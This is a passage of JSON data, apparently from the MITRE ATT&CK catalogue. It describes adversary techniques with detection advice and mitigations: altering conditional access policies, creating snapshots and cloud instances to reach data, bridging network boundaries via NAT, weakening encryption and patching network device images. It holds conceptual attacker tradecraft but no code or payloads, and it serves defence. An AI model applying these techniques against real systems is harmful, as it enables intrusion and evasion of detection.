Registry: Windows Registry Key Modification","Process: OS API Execution","File: File Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Restrict Registry permissions to disallow the modification of sensitive Registry keys such as <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>."},{"id":"M1028","name":"Operating System Configuration","description":"Starting in Windows 11 22H2, the <code>EnableMPRNotifications</code> policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers. <a href=\"https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EnableMPRNotifications)</a>"},{"id":"M1047","name":"Audit","description":"Periodically review for new and unknown network provider DLLs within the Registry (<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider\\ProviderPath</code>).\n\nEnsure only valid network provider DLLs are registered. The name of these can be found in the Registry key at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>, and have corresponding service subkey pointing to a DLL at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider</code>."}]},{"id":"T1556.009","name":"Conditional Access Policies","description":"Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Conditional Access)</a> <a href=\"https://jumpcloud.com/support/get-started-conditional-access-policies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: JumpCloud Conditional Access Policies)</a> <a href=\"https://support.okta.com/help/s/article/Conditional-access-based-on-device-security-posture?language=en_US\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Conditional Access Policies)</a> In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain <code>condition</code> attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS IAM Conditions)</a> <a href=\"https://cloud.google.com/iam/docs/conditions-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP IAM Conditions)</a> These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.","detection":"","platforms":["IaaS","Identity Provider"],"dataSources":["Active Directory: Active Directory Object Modification","Cloud Service: Cloud Service Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to modify conditional access policies to only those required."}]}]},{"id":"T1578","name":"Modify Cloud Compute Infrastructure","description":"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>","detection":"Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":["IaaS"],"dataSources":["Instance: Instance Metadata","Instance: Instance Stop","Snapshot: Snapshot Creation","Volume: Volume Modification","Instance: Instance Modification","Instance: Instance Creation","Volume: Volume Metadata","Instance: Instance Start","Cloud Service: Cloud Service Metadata","Volume: Volume Creation","Snapshot: Snapshot Modification","Snapshot: Snapshot Metadata","Volume: Volume Deletion","Snapshot: Snapshot Deletion","Instance: Instance Deletion"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions for creating, deleting, and otherwise altering compute components in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>"},{"id":"M1047","name":"Audit","description":"Routinely monitor user permissions to ensure only the expected users have the capability to modify cloud compute infrastructure components."}],"subTechniques":[{"id":"T1578.001","name":"Create Snapshot","description":"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>","detection":"The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.\n\nIn AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details. <a href=\"https://docs.aws.amazon.com/aws-backup/latest/devguide/logging-using-cloudtrail.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Cloud Trail Backup API)</a>.\n\nIn Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs. <a href=\"https://docs.microsoft.com/en-us/azure/backup/backup-azure-monitoring-use-azuremonitor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure - Monitor Logs)</a>\n\nGoogle's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create</code> command to create a new VM disk from a snapshot. <a href=\"https://cloud.google.com/logging/docs/audit#admin-activity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloud Audit Logs)</a> It is also possible to detect the usage of the GCP API with the <code>\"sourceSnapshot\":</code> parameter pointed to <code>\"global/snapshots/[BOOT_SNAPSHOT_NAME]</code>. <a href=\"https://cloud.google.com/compute/docs/instances/create-start-instance#api_2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP - Creating and Starting a VM)</a>","platforms":["IaaS"],"dataSources":["Snapshot: Snapshot Creation","Snapshot: Snapshot Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions for creating snapshots or backups in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>"},{"id":"M1047","name":"Audit","description":"Routinely check user permissions to ensure only the expected users have the capability to create snapshots and backups."}]},{"id":"T1578.002","name":"Create Cloud Instance","description":"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.","detection":"The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances</code> event, and in Azure the creation of a VM may be captured in Azure activity logs. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-search-api-calls/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS CloudTrail Search)</a> <a href=\"https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Activity Logs)</a> Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create</code> to create a VM. <a href=\"https://cloud.google.com/logging/docs/audit#admin-activity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloud Audit Logs)</a>","platforms":["IaaS"],"dataSources":["Instance: Instance Creation","Instance: Instance Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions for creating new instances in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>"},{"id":"M1047","name":"Audit","description":"Routinely check user permissions to ensure only the expected users have the capability to create new instances."}]},{"id":"T1578.003","name":"Delete Cloud Instance","description":"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>","detection":"The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances</code> event, and in Azure the deletion of a VM may be captured in Azure activity logs. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-search-api-calls/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS CloudTrail Search)</a> <a href=\"https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Activity Logs)</a> Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete</code> to delete a VM. <a href=\"https://cloud.google.com/logging/docs/audit#admin-activity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloud Audit Logs)</a>","platforms":["IaaS"],"dataSources":["Instance: Instance Metadata","Instance: Instance Deletion"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions for deleting new instances in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies. <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mtrends-2020.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M-Trends 2020)</a>"},{"id":"M1047","name":"Audit","description":"Routinely check user permissions to ensure only the expected users have the capability to delete new instances."}]},{"id":"T1578.004","name":"Revert Cloud Instance","description":"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM. <a href=\"https://www.techrepublic.com/blog/the-enterprise-cloud/backing-up-and-restoring-snapshots-on-amazon-ec2-machines/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tech Republic - Restore AWS Snapshots)</a> <a href=\"https://cloud.google.com/compute/docs/disks/restore-and-delete-snapshots\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google - Restore Cloud Snapshot)</a>","detection":"Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":["IaaS"],"dataSources":["Instance: Instance Start","Instance: Instance Metadata","Instance: Instance Stop","Instance: Instance Modification"],"mitigations":[]},{"id":"T1578.005","name":"Modify Cloud Compute Configurations","description":"Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\n\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim’s entire quota. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/07/25/cryptojacking-understanding-and-defending-against-cloud-compute-resource-abuse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Cryptojacking 2023)</a> Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines. <a href=\"https://learn.microsoft.com/en-us/azure/governance/policy/samples/built-in-policies#compute\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Policy)</a>\n\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions.","detection":"","platforms":["IaaS"],"dataSources":["Cloud Service: Cloud Service Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to request quotas adjustments or modify tenant-level compute setting to only those required."},{"id":"M1047","name":"Audit","description":"Routinely monitor user permissions to ensure only the expected users have the capability to request quota adjustments or modify tenant-level compute settings."}]}]},{"id":"T1599","name":"Network Boundary Bridging","description":"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals. <a href=\"https://securelist.com/lazarus-threatneedle/100803/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky ThreatNeedle Feb 2021)</a>  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.","detection":"Consider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.\n\nMonitor the border network device’s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized.","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Upon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective."},{"id":"M1043","name":"Credential Access Protection","description":"Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - AAA)</a>"}],"subTechniques":[{"id":"T1599.001","name":"Network Address Translation Traversal","description":"Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses. <a href=\"https://tools.ietf.org/html/rfc1918\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RFC1918)</a>\n\nWhen an adversary gains control of a network boundary device, they may modify NAT configurations to send traffic between two separated networks, or to obscure their activities.  In network designs that require NAT to function, such modifications enable the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In network designs that do not require NAT, adversaries may use address translation to further obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities.","detection":"Consider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.\n\nMonitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Block Traffic\tUpon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective."},{"id":"M1043","name":"Credential Access Protection","description":"Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - AAA)</a>"}]}]},{"id":"T1600","name":"Weaken Encryption","description":"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a>\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as Modify System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"There is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image. Some detection methods require vendor support to aid in investigation.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[],"subTechniques":[{"id":"T1600.001","name":"Reduce Key Space","description":"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a>\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[]},{"id":"T1600.002","name":"Disable Crypto Hardware","description":"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space). <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[]}]},{"id":"T1601","name":"Modify System Image","description":"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.","detection":"Most embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with Patch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file. \n\nCompare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a>\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1027","name":"Password Policies","description":"Refer to NIST guidelines when creating password policies. <a href=\"https://pages.nist.gov/800-63-3/sp800-63b.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST 800-63-3)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1043","name":"Credential Access Protection","description":"Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#40\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Credentials Management)</a>"},{"id":"M1045","name":"Code Signing","description":"Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS)</a>"},{"id":"M1046","name":"Boot Integrity","description":"Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"}],"subTechniques":[{"id":"T1601.001","name":"Patch System Image","description":"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses. <a href=\"https://drwho.virtadpt.net/images/killing_the_myth_of_cisco_ios_rootkits.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Killing the myth of Cisco IOS rootkits)</a> <a href=\"https://www.usenix.org/legacy/event/woot/tech/final_files/Cui.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Killing IOS diversity myth)</a> <a href=\"http://2015.zeronights.org/assets/files/05-Nosenko.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Shellcode)</a> <a href=\"https://www.recurity-labs.com/research/RecurityLabs_Developments_in_IOS_Forensics.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Forensics Developments)</a> <a href=\"https://www.blackhat.com/presentations/bh-usa-09/NEILSON/BHUSA09-Neilson-NetscreenDead-SLIDES.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper Netscreen of the Dead)</a> Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be 